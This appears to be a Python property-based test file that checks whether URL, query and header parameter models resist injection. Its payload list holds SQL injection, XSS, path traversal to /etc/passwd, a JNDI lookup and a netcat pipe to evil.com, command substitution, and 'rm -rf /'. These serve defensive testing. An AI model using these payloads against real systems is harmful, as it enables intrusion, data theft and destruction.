@pytest.mark.property
class TestParamInjectionResistance:
    """Property-based tests for injection resistance across all param models."""

    injection_patterns = st.sampled_from([
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "$(whoami)",
        "`cat /etc/passwd`",
        "| nc evil.com 1234",
        "&& rm -rf /",
    ])

    @given(injection_patterns)
    @settings(max_examples=30)
    def test_url_field_resists_injection(self, injection: str) -> None:
        """URL field should not accept injection patterns."""
        try:
            FetchParams(url=injection)
            assert injection.startswith(("http://", "https://"))
        except (ValueError, UrlSafetyError):
            pass

    @given(injection_patterns)
    @settings(max_examples=20)
    def test_query_field_resists_injection(self, injection: str) -> None:
        """Query field should sanitize injection patterns."""
        try:
            SearchParams(query=injection)
            assert len(injection) <= 2000
        except ValueError:
            pass

    @given(st.dictionaries(
        keys=injection_patterns,
        values=st.text(max_size=100),
    ))
    @settings(max_examples=20)
    def test_headers_resist_injection(self, headers: dict[str, str]) -> None:
        """Headers should filter injection patterns."""
        result = filter_headers(headers)
        if result:
            for key, value in result.items():
                assert key.lower() not in {
                    "authorization", "cookie", "host", "origin",
                }
                assert "\r" not in value
                assert "\n" not in value


